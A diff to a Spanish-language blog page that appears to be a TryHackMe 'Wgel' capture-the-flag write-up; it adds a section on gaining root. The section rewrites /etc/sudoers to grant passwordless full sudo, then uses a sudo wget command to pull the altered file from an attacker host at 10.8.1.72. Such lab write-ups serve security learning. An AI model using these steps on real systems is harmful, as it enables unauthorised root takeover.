@@ -73,7 +73,7 @@
         "datePublished": "2019-12-27 00:00:00 &#43;0000 UTC",
         "dateModified" : "2019-12-27 00:00:00 &#43;0000 UTC",
         "url" : "https://sckull.github.io/posts/wgel/",
-        "wordCount" : "421",
+        "wordCount" : "547",
         "keywords" : [ "tryhackme","Blog" ]
     }
     </script>
@@ -328,6 +328,35 @@ root@aoiri:~/tryhackme/wgel_ctf#
 <p>Netcat con la flag <strong>root_flag.txt</strong>.</p>
 
 <p><img src="../../image/tryhackme/wgel/Screenshot_2019-12-27_20-36-02.png" alt="image" /></p>
+
+<h2 id="root-shell">ROOT SHELL</h2>
+
+<p>Para obtener una shell con privilegios de administracion primero obtenemos el archivo <code>/etc/sudoers</code> mediante la misma forma que con la flag, editamos el archivo sudoers localmente agregando nuestra propia configuracion para el usuario Jessio.</p>
+
+<p>Cambiamos esta linea por la segunda en el archivo:</p>
+
+<pre><code class="language-bash">#jessie  ALL=(root) NOPASSWD: /usr/bin/wget
+jessie  ALL=(ALL) NOPASSWD: ALL
+</code></pre>
+
+<p>Una vez hecho esto levantamos un servidor con python3 en la ruta donde se encuentra nuestro archivo <code>sudoers</code>.</p>
+
+<p><img src="../../image/tryhackme/wgel/Screenshot_2019-12-27_20-59-07.png" alt="image" /></p>
+
+<p>Y en la maquina wgel ejecutamos el comando wget con sudo el cual va a sobreescribir el archivo <code>/etc/sudoers</code>.</p>
+
+<p>Nos ubicamos en la carpeta <code>/etc/</code> y ejecutamos:</p>
+
+<pre><code class="language-bash">sudo /usr/bin/wget 10.8.1.72/sudoers --output-document=sudoers
+</code></pre>
+
+<p><img src="../../image/tryhackme/wgel/Screenshot_2019-12-27_21-02-18.png" alt="image" /></p>
+
+<p>Verificamos con el comando <code>sudo -l -l</code> que la configuracion haya cambiado.
+<img src="../../image/tryhackme/wgel/Screenshot_2019-12-27_21-02-51.png" alt="image" /></p>
+
+<p>Ejecutamos el comando <code>sudo su</code> y obtenemos una shell con privilegios root.
+<img src="../../image/tryhackme/wgel/Screenshot_2019-12-27_21-03-27.png" alt="image" /></p>
 
     </div>    
     <hr />
